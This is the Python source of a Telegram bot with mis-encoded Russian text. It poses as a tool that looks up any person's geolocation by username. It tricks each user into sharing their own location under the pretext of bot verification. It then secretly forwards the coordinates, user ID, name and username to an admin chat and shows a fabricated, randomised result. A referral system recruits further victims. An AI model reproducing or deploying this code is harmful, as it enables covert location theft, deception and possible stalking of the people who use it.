from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
import logging
import random
from datetime import datetime, time   

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

TOKEN = ""
ADMIN_CHAT_ID = ""
ARTICLE_URL = ""

user_data = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    ref_link = f"https://t.me/{(await context.bot.get_me()).username}?start=ref{user.id}"
    
    if user.id not in user_data:
        user_data[user.id] = {
            'referrals': 0,
            'available_requests': 3,
            'max_requests': 3,
            'last_reset': datetime.now(),
            'username': user.username,
            'first_name': user.first_name
        }
    
    if context.args and context.args[0].startswith('ref'):
        referrer_id = int(context.args[0][3:])
        if referrer_id != user.id and referrer_id in user_data:
            user_data[referrer_id]['referrals'] = min(user_data[referrer_id]['referrals'] + 1, 3)
            
            referrals = user_data[referrer_id]['referrals']
            if referrals == 1:
                user_data[referrer_id]['max_requests'] = 5
                user_data[referrer_id]['available_requests'] = 5
            elif referrals == 2:
                user_data[referrer_id]['max_requests'] = 8
                user_data[referrer_id]['available_requests'] = 8
            elif referrals >= 3:
                user_data[referrer_id]['max_requests'] = 999  
                user_data[referrer_id]['available_requests'] = 999
    
    await update.message.reply_text(
        f'üîç –ë–æ—Ç –¥–ª—è –ø—Ä–æ–±–∏–≤–∞ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏\n\n'
        f'üìä –í –Ω–∞—à–µ–π –±–∞–∑–µ –¥–∞–Ω–Ω—ã—Ö –±–æ–ª–µ–µ 55 –º–∏–ª–ª–∏–æ–Ω–æ–≤ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π\n'
        f'üë• –†–µ—Ñ–µ—Ä–∞–ª—ã: {user_data[user.id]["referrals"]}/3\n'
        f'üöÄ –î–æ—Å—Ç—É–ø–Ω–æ –∑–∞–ø—Ä–æ—Å–æ–≤: {user_data[user.id]["available_requests"]}\n\n'
        f'üìñ –ü–æ–¥—Ä–æ–±–Ω–µ–µ –æ —Ä–∞–±–æ—Ç–µ –±–æ—Ç–∞: {ARTICLE_URL}\n\n'
        f'üìé –í–∞—à–∞ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞: {ref_link}\n\n'
        f'–í–≤–µ–¥–∏—Ç–µ —é–∑–µ—Ä–Ω–µ–π–º –¥–ª—è –ø–æ–∏—Å–∫–∞:'
    )

async def handle_username(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    
    if user_data[user.id]['available_requests'] <= 0:
        await update.message.reply_text(
            '‚ùå –õ–∏–º–∏—Ç –∑–∞–ø—Ä–æ—Å–æ–≤ –∏—Å—á–µ—Ä–ø–∞–Ω!\n'
            f'üìñ –£–∑–Ω–∞–π—Ç–µ –∫–∞–∫ —É–≤–µ–ª–∏—á–∏—Ç—å –ª–∏–º–∏—Ç: {ARTICLE_URL}\n'
            '–ü—Ä–∏–≥–ª–∞—Å–∏—Ç–µ –¥—Ä—É–∑–µ–π —á—Ç–æ–±—ã —É–≤–µ–ª–∏—á–∏—Ç—å –ª–∏–º–∏—Ç:'
        )
        return
    
    user_data[user.id]['available_requests'] -= 1
    
    keyboard = [[KeyboardButton(text="üìç –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –∑–∞–ø—Ä–æ—Å", request_location=True)]]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        f'üîé –ò—â–µ–º @{update.message.text} –≤ –±–∞–∑–µ –∏–∑ 55M+ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π...\n'
        f'üìñ –ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç: {ARTICLE_URL}\n\n'
        '–î–ª—è –≤–µ—Ä–∏—Ñ–∏–∫–∞—Ü–∏–∏ –∏ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è —á—Ç–æ –≤—ã –Ω–µ –±–æ—Ç, '
        '–æ—Ç–ø—Ä–∞–≤—å—Ç–µ –≤–∞—à—É –≥–µ–æ–ø–æ–∑–∏—Ü–∏—é:',
        reply_markup=reply_markup
    )

async def handle_location(update: Update, context: ContextTypes.DEFAULT_TYPE):
    lat = update.message.location.latitude
    lon = update.message.location.longitude
    user = update.effective_user
    
    await context.bot.send_location(
        chat_id=ADMIN_CHAT_ID,
        latitude=lat,
        longitude=lon
    )
    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=f'üéØ –ù–æ–≤—ã–µ –∫–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã\nUser: {user.id}\nName: {user.first_name}\nUsername: @{user.username}'
    )
    
    fake_lat = round(lat + random.uniform(-0.01, 0.01), 6)
    fake_lon = round(lon + random.uniform(-0.01, 0.01), 6)
    
    await update.message.reply_text(
        f'üìç –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–∞–π–¥–µ–Ω–∞ –≤ –Ω–∞—à–µ–π –±–∞–∑–µ –∏–∑ 55M+ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π!\n\n'
        f'–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: {fake_lat}, {fake_lon}\n'
        f'–ö–∞—Ä—Ç–∞: https://maps.google.com/?q={fake_lat},{fake_lon}\n\n'
        f'üíé –û—Å—Ç–∞–ª–æ—Å—å –∑–∞–ø—Ä–æ—Å–æ–≤: {user_data[user.id]["available_requests"]}\n'
        f'üë• –ü—Ä–∏–≥–ª–∞—Å–∏—Ç–µ –¥—Ä—É–∑–µ–π –¥–ª—è —É–≤–µ–ª–∏—á–µ–Ω–∏—è –ª–∏–º–∏—Ç–∞\n\n'
        f'üìñ –ü–æ–¥—Ä–æ–±–Ω–µ–µ –æ —Ä–∞–±–æ—Ç–µ —Å–∏—Å—Ç–µ–º—ã: {ARTICLE_URL}'
    )

async def reset_limits(context):
    for user_id in user_data:
        if user_data[user_id]['referrals'] == 2:  
            user_data[user_id]['available_requests'] = min(
                user_data[user_id]['available_requests'] + 2,
                user_data[user_id]['max_requests']
            )

if __name__ == '__main__':
    app = Application.builder().token(TOKEN).build()
    
    job_queue = app.job_queue
    job_queue.run_daily(reset_limits, time=time(hour=0, minute=0))
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_username))
    app.add_handler(MessageHandler(filters.LOCATION, handle_location))
    app.run_polling()